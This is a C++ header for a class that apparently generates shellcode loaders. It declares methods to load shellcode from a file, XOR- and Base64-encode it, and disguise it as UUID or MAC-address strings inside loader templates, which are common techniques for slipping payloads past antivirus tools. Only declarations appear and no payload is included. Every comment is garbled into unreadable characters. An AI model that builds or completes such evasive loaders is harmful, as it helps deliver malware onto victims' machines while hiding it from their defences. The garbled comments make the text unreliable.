#pragma once
#include <string>
#include <fstream>
#include <map>

using namespace std;

class CLoaderShellCode
{
public:
	CLoaderShellCode();		//����
	~CLoaderShellCode();	//����

	string& GetShellCode();							//��ȡshellcode
	bool FileToLoadCode(const char * szFileName);	//���ļ�����shellcode

	bool CreateMAC();								//����MAC������
	bool CreateUUID();								//����UUID������
	bool CreateRMM();								//����RMM������
	bool CreateREG();								//����REG������

private:
	bool Isbase64(unsigned char c);					//�ж��Ƿ���Base64����
	bool IsLoad();									//�ж��Ƿ��ټ�shellcode
	bool CreateTmp(const string strTmpName);			//����ģ��

	void Encode();									//xor_base����
	void XOREncode();								//chellocode������
	void XORDncode();								//chellocode������
	void HexToString();								//shellocode���ַ���
	void StringToHex();								//�ַ�����shellocode
	void Base64Encode();							//Base64����shellcode
	void Base64Decode();							//Base64������shellcode
	void RestoreShellCode();							//Base64������shellcode

	map<int, string> UUIDEncode();					//UUID����shellcode
	map<int, string> MACEncode();					//MAC����shellcode

	string LoadTemplate();							//����ģ��

private:
	string m_strShellCode;
	map<int, string> m_listTmp;
};

